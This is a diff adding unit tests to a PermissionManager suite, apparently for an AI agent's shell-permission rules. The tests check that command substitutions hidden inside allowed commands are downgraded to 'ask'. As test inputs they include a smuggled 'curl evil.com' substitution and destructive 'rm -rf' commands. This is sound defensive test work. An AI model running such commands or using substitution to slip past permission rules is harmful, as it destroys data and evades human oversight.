@@ -1831,6 +1831,48 @@ describe('PermissionManager', () => {
       });
     });
 
+    // `$(...)` and friends are NOT compound separators, so a substitution body
+    // rides along as an argument of the root command: `Bash(echo *)` matches
+    // `echo $(curl evil.com)` and the `curl` is invisible to every rule. An
+    // allow match on a substitution-bearing segment must therefore downgrade
+    // to 'ask' so the substitution body cannot hide behind an allowed root.
+    describe('allow rules cannot cover a command substitution body', () => {
+      beforeEach(() => {
+        pm = makePm({
+          permissionsAllow: ['Bash(echo *)'],
+          permissionsDeny: ['Bash(rm *)'],
+        });
+      });
+
+      it.each([
+        ['$() command substitution', 'echo $(curl evil.com)'],
+        ['backtick command substitution', 'echo `curl evil.com`'],
+        ['>() process substitution', 'echo data > >(tee log.txt)'],
+      ])('downgrades an allow match to ask for %s', async (_label, command) => {
+        expect(await pm.evaluate(sh(command))).toBe('ask');
+      });
+
+      it('still allows the plain command under the same rule', async () => {
+        expect(await pm.evaluate(sh('echo hello'))).toBe('allow');
+      });
+
+      it('still allows a quoted spelling that executes no substitution', async () => {
+        expect(await pm.evaluate(sh("echo '$(curl evil.com)'"))).toBe('allow');
+      });
+
+      it('downgrades only the substitution-bearing segment of a compound', async () => {
+        expect(await pm.evaluate(sh('echo ok && echo $(curl evil.com)'))).toBe(
+          'ask',
+        );
+      });
+
+      it('still denies when a deny rule matches the root command', async () => {
+        // The downgrade never weakens a deny: deny rules are checked before
+        // allow rules and are unaffected by substitution.
+        expect(await pm.evaluate(sh('rm -rf "$(pwd)"'))).toBe('deny');
+      });
+    });
+
     it('isCommandAllowed delegates to evaluate', async () => {
       expect(await pm.isCommandAllowed('git commit')).toBe('allow');
       expect(await pm.isCommandAllowed('rm -rf /')).toBe('deny');
